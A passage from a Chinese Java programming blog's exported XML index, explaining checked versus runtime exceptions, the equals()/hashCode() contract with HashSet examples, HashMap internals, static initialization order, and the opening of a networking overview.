        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>java 中的Exception RuntimeException 区别</title>
    <url>/blog/plang/java/base/exception/</url>
    <content><![CDATA[<p>JAVA项目中直接抛出Exception或RuntimeException为严重质量问题。如要自己抛出异常就需要自定义异常，这是好的编程习惯。</p>
<p>自定义异常通常会继承Exception或RuntimeException，这两个有点小区别：</p>
<p>抛出Exception，外部代码必须要显示处理，try-catch或再次抛出，否则编译会报错，一般IDE也会提示错误。</p>
<p>抛出RuntimeException,外部代码不用显示处理，编译可以通过，在运行时如没有被try-catch处理，JVM会处理这种异常。</p>
<pre><code>public class RuntimeException &#123;
    public static void main(String[] args) &#123;
        String str=&quot;123&quot;;
        int temp=Integer.parseInt(str);
        System.out.println(temp*temp);
    &#125;
&#125;
</code></pre>
<p>parseInt方法的源代码如下：</p>
<pre><code>public static int parseInt(String s) throws NumberFormatException &#123;
    return parseInt(s,10);
&#125;
</code></pre>
<p>NumberFormatException是RuntimeException的子类，所以外部不处理这种异常是可以的。</p>
<p>一般项目中，异常是都要被处理了，所以一般我们自己实现的异常要继承Exception，强制要求调用者处理抛出的异常。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>hashcode()和equals()方法</title>
    <url>/blog/plang/java/base/hashcode-equals/</url>
    <content><![CDATA[<p>首先equals()和hashcode()这两个方法都是从object类中继承过来的。<br>equals()方法在object类中定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public boolean equals( Object obj )</span><br><span class="line">&#123;</span><br><span class="line"> return (this == obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显是对两个对象的地址值进行的比较（即比较引用是否相同）。但是我们必需清楚，当String<br>、Math、还有Integer、Double等这些封装类在使用equals()方法时，已经覆盖了object类的equals（）方法。比如在String类中如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> public boolean equals( Object anObject )</span><br><span class="line">&#123;</span><br><span class="line">    if( this == anObject )</span><br><span class="line">    &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    if( anObject instanceof String )</span><br><span class="line">    &#123;</span><br><span class="line">        String anotherString = (String)anObject;</span><br><span class="line">        int n = count;</span><br><span class="line">        if( n == anotherString.count )</span><br><span class="line">        &#123;</span><br><span class="line">            char v1[] = value;</span><br><span class="line">            char v2[] = anotherString.value;</span><br><span class="line">            int i = offset;</span><br><span class="line">            int j = anotherString.offset;</span><br><span class="line">            while( n-- != 0 )</span><br><span class="line">            &#123;</span><br><span class="line">                if( v1[i++] != v2[j++] )</span><br><span class="line">                    return false;</span><br><span class="line">            &#125;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显，这是进行的内容比较，而已经不再是地址的比较。依次类推Double、Integer、Math。。。。等等这些类都是重写了equals()方法的，从而进行的是内容的比较。当然了基本类型是进行值的比较，这个没有什么好说的。</p>
<p>我们还应该注意，Java语言对equals()的要求如下，这些要求是必须遵循的：</p>
<ul>
<li>对称性：如果x.equals(y)返回是”true”，那么y.equals(x)也应该返回是”true”。</li>
<li>反射性：x.equals(x)必须返回是”true”。</li>
<li>类推性：如果x.equals(y)返回是”true”，而且y.equals(z)返回是”true”，那么z.equals(x)也应该返回是”true”。</li>
<li>还有一致性：如果x.equals(y)返回是”true”，只要x和y内容一直不变，不管你重复x.equals(y)多少次，返回都是”true”。</li>
<li>任何情况下，x.equals(null)，永远返回是”false”；x.equals(和x不同类型的对象)永远返回是”false”。</li>
</ul>
<p>以上这五点是重写equals()方法时，必须遵守的准则，如果违反会出现意想不到的结果，请大家一定要遵守。</p>
<p>其次是hashcode() 方法，在object类中定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public native int hashCode();</span><br></pre></td></tr></table></figure>

<p>说明是一个本地方法，它的实现是根据本地机器相关的。当然我们可以在自己写的类中覆盖hashcode()方法，比如String、Integer、<br>Double等这些类都是覆盖了hashcode()方法的。例如在String类中定义的hashcode()方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   public int hashCode()</span><br><span class="line">&#123;</span><br><span class="line"> int h = hash;</span><br><span class="line"> if( h == 0 )</span><br><span class="line"> &#123;</span><br><span class="line">     int off = offset;</span><br><span class="line">     char val[] = value;</span><br><span class="line">     int len = count;</span><br><span class="line"></span><br><span class="line">     for( int i = 0; i &lt; len; i++ )</span><br><span class="line">     &#123;</span><br><span class="line">         h = 31 * h + val[off++];</span><br><span class="line">     &#125;</span><br><span class="line">     hash = h;</span><br><span class="line"> &#125;</span><br><span class="line"> return h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解释一下这个程序（String的API中写到）：</p>
<p>s[0]<em>31^(n-1) + s[1]</em>31^(n-2) + … + s[n-1]</p>
<p>使用 int 算法，这里 s[i] 是字符串的第 i 个字符，n 是字符串的长度，^<br>表示求幂。（空字符串的哈希码为 0。）</p>
<p>首先，想要明白hashCode的作用，你必须要先知道Java中的集合。总的来说，Java中的集合（Collection）有两类，一类是List，再有一类是Set。前者集合内的元素是有序的，元素可以重复；后者元素无序，但元素不可重复。</p>
<p>那么这里就有一个比较严重的问题了：要想保证元素不重复，可两个元素是否重复应该依据什么来判断呢？</p>
<p>这就是Object.equals方法了。但是，如果每增加一个元素就检查一次，那么当元素很多时，后添加到集合中的元素比较的次数就非常多了。</p>
<p>也就是说，如果集合中现在已经有1000个元素，那么第1001个元素加入集合时，它就要调用1000次equals方法。这显然会大大降低效率。</p>
<p>于是，Java采用了哈希表的原理。哈希算法也称为散列算法，是将数据依特定算法直接指定到一个地址上。</p>
<p>初学者可以这样理解，hashCode方法实际上返回的就是对象存储的物理地址（实际可能并不是）。</p>
<p>这样一来，当集合要添加新的元素时，先调用这个元素的hashCode方法，就一下子能定位到它应该放置的物理位置上。</p>
<p>如果这个位置上没有元素，它就可以直接存储在这个位置上，不用再进行任何比较了；如果这个位置上已经有元素了，就调用它的equals方法与新元素进行比较，相同的话就不存了，不相同就散列其它的地址。</p>
<p>所以这里存在一个冲突解决的问题。这样一来实际调用equals方法的次数就大大降低了，几乎只需要一两次。</p>
<p>所以，Java对于eqauls方法和hashCode方法是这样规定的：</p>
<p>1)、如果两个对象相同，那么它们的hashCode值一定要相同；</p>
<p>2)、如果两个对象的hashCode相同，它们并不一定相同<br>上面说的对象相同指的是用eqauls方法比较。 <br>你当然可以不按要求去做了，但你会发现，相同的对象可以出现在Set集合中。同时，增加新元素的效率会大大下降。</p>
<p>3).这里我们首先要明白一个问题：<br>equals()相等的两个对象，hashcode()一定相等；<br>equals（）不相等的两个对象，却并不能证明他们的hashcode()不相等。换句话说，equals()方法不相等的两个对象，hashcode()有可能相等。（我的理解是由于哈希码在生成的时候产生冲突造成的）。 <br>反过来：hashcode()不等，一定能推出equals()也不等；hashcode()相等，equals()可能相等，也可能不等。解释下第3点的使用范围，我的理解是在object、String等类中都能使用。在object类中，hashcode()方法是本地方法，返回的是对象的地址值，而object类中的equals()方法比较的也是两个对象的地址值，如果equals()相等，说明两个对象地址值也相等，当然hashcode()<br>也就相等了；在String类中，equals()返回的是两个对象内容的比较，当两个对象内容相等时，<br>Hashcode()方法根据String类的重写（第2点里面已经分析了）代码的分析，也可知道hashcode()返回结果也会相等。以此类推，可以知道Integer、Double等封装类中经过重写的equals()和hashcode()方法也同样适合于这个原则。当然没有经过重写的类，在继承了object类的equals()和hashcode()方法后，也会遵守这个原则。</p>
<p>4.谈到hashcode()和equals()就不能不说到hashset,hashmap,hashtable中的使用，具体是怎样呢，请看如下分析：</p>
<p>Hashset是继承Set接口，Set接口又实现Collection接口，这是层次关系。那么hashset是根据什么原理来存取对象的呢？ <br>在hashset中不允许出现重复对象，元素的位置也是不确定的。在hashset中又是怎样判定元素是否重复的呢？在java的集合中，判断两个对象是否相等的规则是：</p>
<p>1)，判断两个对象的hashCode是否相等<br>如果不相等，认为两个对象也不相等，完毕 如果相等，转入2)<br>（这一点只是为了提高存储效率而要求的，其实理论上没有也可以，但如果没有，实际使用时效率会大大降低，所以我们这里将其做为必需的。后面会重点讲到这个问题。）</p>
<p>2)，判断两个对象用equals运算是否相等 如果不相等，认为两个对象也不相等<br>如果相等，认为两个对象相等（equals()是判断两个对象是否相等的关键） <br>为什么是两条准则，难道用第一条不行吗？不行，因为前面已经说了，hashcode()相等时，equals()方法也可能不等，所以必须用第2条准则进行限制，才能保证加入的为非重复元素。 <br>比如下面的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> public static void main( String args[] )</span><br><span class="line">&#123;</span><br><span class="line"> String s1 = new String( &quot;zhaoxudong&quot; );</span><br><span class="line"> String s2 = new String( &quot;zhaoxudong&quot; );</span><br><span class="line"> System.out.println( s1 == s2 );// false</span><br><span class="line"> System.out.println( s1.equals( s2 ) );// true</span><br><span class="line"> System.out.println( s1.hashCode() );// s1.hashcode()等于s2.hashcode()</span><br><span class="line"> System.out.println( s2.hashCode() );</span><br><span class="line"> Set hashset = new HashSet();</span><br><span class="line"> hashset.add( s1 );</span><br><span class="line"> hashset.add( s2 );</span><br><span class="line"> /* 实质上在添加s1,s2时，运用上面说到的两点准则，可以知道hashset认为s1和s2是相等的，是在添加重复元素，所以让s2覆盖了s1; */</span><br><span class="line"> Iterator it = hashset.iterator();</span><br><span class="line"> while( it.hasNext() )</span><br><span class="line"> &#123;</span><br><span class="line">     System.out.println( it.next() );</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后在while循环的时候只打印出了一个”zhaoxudong”。 输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">false </span><br><span class="line">true </span><br><span class="line">-967303459 </span><br><span class="line">-967303459</span><br></pre></td></tr></table></figure>

<p>这是因为String类已经重写了equals()方法和hashcode()方法，所以在根据上面的第1.2条原则判定时，hashset认为它们是相等的对象，进行了重复添加。 <br>但是看下面的程序：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class HashSetTest &#123;</span><br><span class="line">public static void main( String[] args )</span><br><span class="line">&#123;</span><br><span class="line">    HashSet hs = new HashSet();</span><br><span class="line">    hs.add( new Student( 1, &amp;quot;zhangsan&amp;quot; ) );</span><br><span class="line">    hs.add( new Student( 2, &amp;quot;lisi&amp;quot; ) );</span><br><span class="line">    hs.add( new Student( 3, &amp;quot;wangwu&amp;quot; ) );</span><br><span class="line">    hs.add( new Student( 1, &amp;quot;zhangsan&amp;quot; ) );</span><br><span class="line"></span><br><span class="line">    Iterator it = hs.iterator();</span><br><span class="line">    while( it.hasNext() )</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println( it.next() );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>}</p>
<p>class Student {</p>
<pre><code>int num;

String name;

Student( int num, String name )
&#123;
    this.num = num;
    this.name = name;
&#125;

public String toString()
&#123;
    return num + &amp;quot;:&amp;quot; + name;
&#125;
</code></pre>
<p>}</p>
<p>输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1:zhangsan </span><br><span class="line">1:zhangsan </span><br><span class="line">3:wangwu </span><br><span class="line">2:lisi</span><br></pre></td></tr></table></figure>

<p> </p>
<p>问题出现了，为什么hashset添加了相等的元素呢，这是不是和hashset的原则违背了呢？回答是：没有</p>
<p>因为在根据hashcode()对两次建立的new <br>Student(1,”zhangsan”)对象进行比较时，生成的是不同的哈希码值，所以hashset把他当作不同的对象对待了，当然此时的<br>equals()方法返回的值也不等（这个不用解释了吧）。那么为什么会生成不同的哈希码值呢？上面我们在比较s1和s2的时候不是生成了同样的哈希码吗？原因就在于我们自己写的Student类并没有重新自己的hashcode()和equals()方法，所以在比较时，是继承的object类中的<br>hashcode()方法，呵呵，各位还记得object类中的hashcode()方法比较的是什么吧！！</p>
<p>它是一个本地方法，比较的是对象的地址（引用地址），使用new方法创建对象，两次生成的当然是不同的对象了（这个大家都能理解吧。。。），造成的结果就是两个对象的hashcode()返回的值不一样。所以根据第一个准则，hashset会把它们当作不同的对象对待，自然也用不着第二个准则进行判定了。那么怎么解决这个问题呢？？</p>
<p>答案是：在Student类中重新hashcode()和equals()方法。 例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Student</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    int num;</span><br><span class="line"></span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    Student( int num, String name )</span><br><span class="line">    &#123;</span><br><span class="line">        this.num = num;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int hashCode()</span><br><span class="line">    &#123;</span><br><span class="line">        return num * name.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public boolean equals( Object o )</span><br><span class="line">    &#123;</span><br><span class="line">        Student s = (Student)o;</span><br><span class="line">        return num == s.num &amp;&amp; name.equals( s.name );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return num + &quot;:&quot; + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据重写的方法，即便两次调用了new <br>Student(1,”zhangsan”)，我们在获得对象的哈希码时，根据重写的方法hashcode()，获得的哈希码肯定是一样的（这一点应该没有疑问吧）。 <br>当然根据equals()方法我们也可判断是相同的。所以在向hashset集合中添加时把它们当作重复元素看待了。所以运行修改后的程序时，我们会发现运行结果是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1:zhangsan </span><br><span class="line">3:wangwu </span><br><span class="line">2:lisi</span><br></pre></td></tr></table></figure>

<p> </p>
<p>可以看到重复元素的问题已经消除。<br>关于在hibernate的pojo类中，重新equals()和hashcode()的问题：</p>
<p>1)，重点是equals，重写hashCode只是技术要求（为了提高效率）</p>
<p>2)，为什么要重写equals呢，因为在java的集合框架中，是通过equals来判断两个对象是否相等的</p>
<p>3)，在hibernate中，经常使用set集合来保存相关对象，而set集合是不允许重复的。我们再来谈谈前面提到在向hashset集合中添加元素时,怎样判断对象是否相同的准则，前面说了两条，其实只要重写equals()这一条也可以。</p>
<p>但当hashset中元素比较多时，或者是重写的equals()方法比较复杂时，我们只用equals()方法进行比较判断，效率也会非常低，所以引入了hashcode()这个方法，只是为了提高效率，但是我觉得这是非常有必要的（所以我们在前面以两条准则来进行hashset的元素是否重复的判断）。 <br>比如可以这样写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public int hashCode()&#123; </span><br><span class="line">return 1;</span><br><span class="line">&#125;//等价于hashcode无效</span><br></pre></td></tr></table></figure>

<p>这样做的效果就是在比较哈希码的时候不能进行判断，因为每个对象返回的哈希码都是1，每次都必须要经过比较equals()方法后才能进行判断是否重复，这当然会引起效率的大大降低。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA源码之HashMap</title>
    <url>/blog/plang/java/base/hashmap/</url>
    <content><![CDATA[<p>HashMap 类的 put(K key , V value) 方法的源代码：</p>
<pre><code> public V put(K key, V value) 
 &#123; 
     // 如果 key 为 null，调用 putForNullKey 方法进行处理
     if (key == null) 
         return putForNullKey(value); 
     // 根据 key 的 keyCode 计算 Hash 值
     int hash = hash(key.hashCode()); 
     // 搜索指定 hash 值在对应 table 中的索引
     int i = indexFor(hash, table.length);
     // 如果 i 索引处的 Entry 不为 null，通过循环不断遍历 e 元素的下一个元素
     for (Entry&lt; K,V&gt; e = table[i]; e != null; e = e.next) 
     &#123; 
         Object k; 
         // 找到指定 key 与需要放入的 key 相等（hash 值相同
         // 通过 equals 比较放回 true）
         if (e.hash == hash &amp;&amp; ((k = e.key) == key 
             || key.equals(k))) 
         &#123; 
             V oldValue = e.value; 
             e.value = value; 
             e.recordAccess(this); 
             return oldValue; 
         &#125; 
     &#125; 
     // 如果 i 索引处的 Entry 为 null，表明此处还没有 Entry 
     modCount++; 
     // 将 key、value 添加到 i 索引处
     addEntry(hash, key, value, i); 
     return null; 
 &#125; 
</code></pre>
<p>上面程序中用到了一个重要的内部接口：Map.Entry，每个 Map.Entry<br>其实就是一个 key-value 对。从上面程序中可以看出：当系统决定存储 HashMap<br>中的 key-value 对时，完全没有考虑 Entry 中的 value，仅仅只是根据 key<br>来计算并决定每个 Entry 的存储位置。这也说明了前面的结论：我们完全可以把<br>Map 集合中的 value 当成 key 的附属，当系统决定了 key<br>的存储位置之后，value 随之保存在那里即可。</p>
<p>上面方法提供了一个根据 hashCode() 返回值来计算 Hash<br>码的方法：hash()，这个方法是一个纯粹的数学计算，其方法如下：</p>
<pre><code>static int hash(int h) 
&#123; 
    h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12); 
    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4); 
&#125; 
</code></pre>
<p>对于任意给定的对象，只要它的 hashCode() 返回值相同，那么程序调用<br>hash(int h) 方法所计算得到的 Hash 码值总是相同的。接下来程序会调用<br>indexFor(int h, int length) 方法来计算该对象应该保存在 table<br>数组的哪个索引处。indexFor(int h, int length) 方法的代码如下：</p>
<pre><code>static int indexFor(int h, int length) 
&#123; 
    return h &amp; (length-1); 
&#125;
</code></pre>
<p>这个方法非常巧妙，它总是通过 h &amp;(table.length -1)<br>来得到该对象的保存位置——而 HashMap 底层数组的长度总是 2 的 n<br>次方，这一点可参看后面关于 HashMap 构造器的介绍。</p>
<p>当 length 总是 2 的倍数时，h &amp; (length-1) 将是一个非常巧妙的设计：假设<br>h&#x3D;5,length&#x3D;16, 那么 h &amp; length - 1 将得到 5；如果 h&#x3D;6,length&#x3D;16, 那么 h<br>&amp; length - 1 将得到 6 ……如果 h&#x3D;15,length&#x3D;16, 那么 h &amp; length - 1<br>将得到 15；但是当 h&#x3D;16 时 , length&#x3D;16 时，那么 h &amp; length - 1 将得到 0<br>了；当 h&#x3D;17 时 , length&#x3D;16 时，那么 h &amp; length - 1 将得到 1<br>了……这样保证计算得到的索引值总是位于 table 数组的索引之内。</p>
<p>根据上面 put 方法的源代码可以看出，当程序试图将一个 key-value 对放入<br>HashMap 中时，程序首先根据该 key 的 hashCode() 返回值决定该 Entry<br>的存储位置：如果两个 Entry 的 key 的 hashCode()<br>返回值相同，那它们的存储位置相同。如果这两个 Entry 的 key 通过 equals<br>比较返回 true，新添加 Entry 的 value 将覆盖集合中原有 Entry 的 value，但<br>key 不会覆盖。如果这两个 Entry 的 key 通过 equals 比较返回<br>false，新添加的 Entry 将与集合中原有 Entry 形成 Entry 链，而且新添加的<br>Entry 位于 Entry 链的头部——具体说明继续看 addEntry() 方法的说明。</p>
<p>当向 HashMap 中添加 key-value 对，由其 key 的 hashCode() 返回值决定该<br>key-value 对（就是 Entry 对象）的存储位置。当两个 Entry 对象的 key 的<br>hashCode() 返回值相同时，将由 key 通过 eqauls()<br>比较值决定是采用覆盖行为（返回 true），还是产生 Entry 链（返回 false）。</p>
<p>上面程序中还调用了 addEntry(hash, key, value, i); 代码，其中 addEntry 是<br>HashMap 提供的一个包访问权限的方法，该方法仅用于添加一个 key-value<br>对。下面是该方法的代码：</p>
<pre><code>void addEntry(int hash, K key, V value, int bucketIndex) 
&#123; 
    // 获取指定 bucketIndex 索引处的 Entry 
    Entry&lt; K,V&gt; e = table[bucketIndex];    // ①
    // 将新创建的 Entry 放入 bucketIndex 索引处，并让新的 Entry 指向原来的 Entry 
    table[bucketIndex] = new Entry&lt; K,V&gt;(hash, key, value, e); 
    // 如果 Map 中的 key-value 对的数量超过了极限
    if (size++ &gt;= threshold) 
        // 把 table 对象的长度扩充到 2 倍。
        resize(2 * table.length);    // ②
&#125; 
</code></pre>
<p>上面方法的代码很简单，但其中包含了一个非常优雅的设计：系统总是将新添加的<br>Entry 对象放入 table 数组的 bucketIndex 索引处——如果 bucketIndex<br>索引处已经有了一个 Entry 对象，那新添加的 Entry 对象指向原有的 Entry<br>对象（产生一个 Entry 链），如果 bucketIndex 索引处没有 Entry<br>对象，也就是上面程序①号代码的 e 变量是 null，也就是新放入的 Entry<br>对象指向 null，也就是没有产生 Entry 链。</p>
<p>上面程序中还有这样两个变量：</p>
<p>* size：该变量保存了该 HashMap 中所包含的 key-value 对的数量。</p>
<p>* threshold：该变量包含了 HashMap 能容纳的 key-value<br>对的极限，它的值等于 HashMap 的容量乘以负载因子（load factor）。</p>
<p>当 size++ &gt;&#x3D; threshold 时，HashMap 会自动调用 resize 方法扩充 HashMap<br>的容量。每扩充一次，HashMap 的容量就增大一倍。</p>
<p>上面程序中使用的 table<br>其实就是一个普通数组，每个数组都有一个固定的长度，这个数组的长度就是<br>HashMap 的容量。HashMap 包含如下几个构造器：</p>
<p>HashMap()：构建一个初始容量为 16，负载因子为 0.75 的 HashMap。</p>
<p>HashMap(int initialCapacity)：构建一个初始容量为<br>initialCapacity，负载因子为 0.75 的 HashMap。</p>
<p>HashMap(int initialCapacity, float<br>loadFactor)：以指定初始容量、指定的负载因子创建一个 HashMap。</p>
<p>当创建一个 HashMap 时，系统会自动创建一个 table 数组来保存 HashMap 中的<br>Entry，下面是 HashMap 中一个构造器的代码：</p>
<pre><code>// 以指定初始化容量、负载因子创建 HashMap 
 public HashMap(int initialCapacity, float loadFactor) 
 &#123; 
     // 初始容量不能为负数
     if (initialCapacity &lt; 0) 
         throw new IllegalArgumentException( 
        &quot;Illegal initial capacity: &quot; + 
             initialCapacity); 
     // 如果初始容量大于最大容量，让出示容量
     if (initialCapacity &gt; MAXIMUM_CAPACITY) 
         initialCapacity = MAXIMUM_CAPACITY; 
     // 负载因子必须大于 0 的数值
     if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) 
         throw new IllegalArgumentException( 
         loadFactor); 
     // 计算出大于 initialCapacity 的最小的 2 的 n 次方值。
     int capacity = 1; 
     while (capacity &lt; initialCapacity) 
         capacity &lt;&lt;= 1; 
     this.loadFactor = loadFactor; 
     // 设置容量极限等于容量 * 负载因子
     threshold = (int)(capacity * loadFactor); 
     // 初始化 table 数组
     table = new Entry[capacity];            // ①
     init(); 
 &#125; 
</code></pre>
<p>对于 HashMap 及其子类而言，它们采用 Hash<br>算法来决定集合中元素的存储位置。当系统开始初始化 HashMap<br>时，系统会创建一个长度为 capacity 的 Entry<br>数组，这个数组里可以存储元素的位置被称为”桶（bucket）”，每个 bucket<br>都有其指定索引，系统可以根据其索引快速访问该 bucket 里存储的元素。</p>
<p>无论何时，HashMap 的每个”桶”只存储一个元素（也就是一个 Entry），由于<br>Entry 对象可以包含一个引用变量（就是 Entry<br>构造器的的最后一个参数）用于指向下一个<br>Entry，因此可能出现的情况是：HashMap 的 bucket 中只有一个 Entry，但这个<br>Entry 指向另一个 Entry ——这就形成了一个 Entry 链。</p>
<p>HashMap 的读取实现</p>
<p>当 HashMap 的每个 bucket 里存储的 Entry 只是单个 Entry<br>——也就是没有通过指针产生 Entry 链时，此时的 HashMap<br>具有最好的性能：当程序通过 key 取出对应 value 时，系统只要先计算出该 key<br>的 hashCode() 返回值，在根据该 hashCode 返回值找出该 key 在 table<br>数组中的索引，然后取出该索引处的 Entry，最后返回该 key 对应的 value<br>即可。看 HashMap 类的 get(K key) 方法代码：</p>
<pre><code> public V get(Object key) 
 &#123; 
     // 如果 key 是 null，调用 getForNullKey 取出对应的 value 
     if (key == null) 
         return getForNullKey(); 
     // 根据该 key 的 hashCode 值计算它的 hash 码
     int hash = hash(key.hashCode()); 
     // 直接取出 table 数组中指定索引处的值，
     for (Entry&lt; K,V&gt; e = table[indexFor(hash, table.length)]; 
         e != null; 
         // 搜索该 Entry 链的下一个 Entr 
         e = e.next)         // ①
     &#123; 
         Object k; 
         // 如果该 Entry 的 key 与被搜索 key 相同
         if (e.hash == hash &amp;&amp; ((k = e.key) == key 
             || key.equals(k))) 
             return e.value; 
     &#125; 
     return null; 
 &#125; 
</code></pre>
<p>从上面代码中可以看出，如果 HashMap 的每个 bucket 里只有一个 Entry<br>时，HashMap 可以根据索引、快速地取出该 bucket 里的 Entry；在发生”Hash<br>冲突”的情况下，单个 bucket 里存储的不是一个 Entry，而是一个 Entry<br>链，系统只能必须按顺序遍历每个 Entry，直到找到想搜索的 Entry<br>为止——如果恰好要搜索的 Entry 位于该 Entry 链的最末端（该 Entry<br>是最早放入该 bucket 中），那系统必须循环到最后才能找到该元素。</p>
<p>归纳起来简单地说，HashMap 在底层将 key-value<br>当成一个整体进行处理，这个整体就是一个 Entry 对象。HashMap 底层采用一个<br>Entry[] 数组来保存所有的 key-value 对，当需要存储一个 Entry<br>对象时，会根据 Hash 算法来决定其存储位置；当需要取出一个 Entry<br>时，也会根据 Hash 算法找到其存储位置，直接取出该<br>Entry。由此可见：HashMap 之所以能快速存、取它所包含的<br>Entry，完全类似于现实生活中母亲从小教我们的：不同的东西要放在不同的位置，需要时才能快速找到它。</p>
<p>当创建 HashMap 时，有一个默认的负载因子（load factor），其默认值为<br>0.75，这是时间和空间成本上一种折衷：增大负载因子可以减少 Hash<br>表（就是那个 Entry<br>数组）所占用的内存空间，但会增加查询数据的时间开销，而查询是最频繁的的操作（HashMap<br>的 get() 与 put()<br>方法都要用到查询）；减小负载因子会提高数据查询的性能，但会增加 Hash<br>表所占用的内存空间。</p>
<p>掌握了上面知识之后，我们可以在创建 HashMap 时根据实际需要适当地调整 load<br>factor<br>的值；如果程序比较关心空间开销、内存比较紧张，可以适当地增加负载因子；如果程序比较关心时间开销，内存比较宽裕则可以适当的减少负载因子。通常情况下，程序员无需改变负载因子的值。</p>
<p>如果开始就知道 HashMap 会保存多个 key-value<br>对，可以在创建时就使用较大的初始化容量，如果 HashMap 中 Entry<br>的数量一直不会超过极限容量（capacity * load factor），HashMap<br>就无需调用 resize() 方法重新分配 table<br>数组，从而保证较好的性能。当然，开始就将初始容量设置太高可能会浪费空间（系统需要创建一个长度为<br>capacity 的 Entry 数组），因此创建 HashMap<br>时初始化容量设置也需要小心对待。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA静态代码块、静态变量、构造方法的执行顺序</title>
    <url>/blog/plang/java/base/javacshsx/</url>
    <content><![CDATA[<pre><code>public class Print &#123;
     public Print(String s)&#123;
         System.out.print(s + &quot; &quot;);
     &#125;
&#125;

 public class Test1 &#123;

    public static Print obj1 = new Print(&quot;1&quot;);
    
    public Print obj2 = new Print(&quot;2&quot;);

    public static Print obj3 = new Print(&quot;3&quot;);
    
    static&#123;
        new Print(&quot;4&quot;);
    &#125;
    
    public static Print obj4 = new Print(&quot;5&quot;);
    
    public Print obj5 = new Print(&quot;6&quot;);
    
    public Test1()&#123;
        new Print(&quot;7&quot;);
    &#125;
    
&#125;

 public class Test2 extends Test1&#123;

    static&#123;
        new Print(&quot;a&quot;);
    &#125;
    
    public static Print obj1 = new Print(&quot;b&quot;);
    
    public Print obj2 = new Print(&quot;c&quot;);
    
    public Test2()&#123;
        new Print(&quot;d&quot;);
    &#125;
    
    public static Print obj3 = new Print(&quot;e&quot;);
    
    public Print obj4 = new Print(&quot;f&quot;);
    
    public static void main(String [] args)&#123;
        Test1 obj1 = new Test2();
        Test1 obj2 = new Test2();
    &#125;
&#125;
</code></pre>
<p>执行main方法，程序输出顺序为：</p>
<pre><code>1 3 4 5 a b e 2 6 7 c f d 2 6 7 c f d
</code></pre>
<p>输出结果表明，程序的执行顺序为：</p>
<p><strong>如果类还没有被加载：</strong></p>
<p>1、先执行父类的静态代码块和静态变量初始化，并且静态代码块和静态变量的执行顺序只跟代码中出现的顺序有关。</p>
<p>2、执行子类的静态代码块和静态变量初始化。</p>
<p>3、执行父类的实例变量初始化</p>
<p>4、执行父类的构造函数</p>
<p>5、执行子类的实例变量初始化</p>
<p>6、执行子类的构造函数</p>
<p><strong>如果类已经被加载：</strong></p>
<p>则静态代码块和静态变量就不用重复执行，再创建类对象时，只执行与实例相关的变量初始化和构造方法。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA网络编程概要</title>
    <url>/blog/plang/java/base/javanetpgm/</url>
    <content><![CDATA[<h2 id="网络七层协议"><a href="#网络七层协议" class="headerlink" title="网络七层协议"></a>网络七层协议</h2><p>7 应用层 : telnet，HTTP,FTP,NFS,SMTP</p>
<p>6 表示层</p>
<p>5 会话层</p>
<p>4 传输层 : 是否选择差错恢复协议还是无差错恢复协议，TCP、UDP协议</p>
<p>3 网络层 ：对端到端的包传输进行定义，IP协议</p>
<p>2 数据链路层 :<br>数据链路的建立,拆除,对数据的检错,纠错是数据链路层的基本任务</p>
<p>1 物理层：有关传输介质的特性标准，提供传输媒体及其连接</p>
<h2 id="网络四层层协议"><a href="#网络四层层协议" class="headerlink" title="网络四层层协议"></a>网络四层层协议</h2><p>实际的实现不是按七层开发来的，是四层。</p>
<p>七层协议中的物理层、会话层、表达层只是一种定义，实际上是没有实现的。</p>
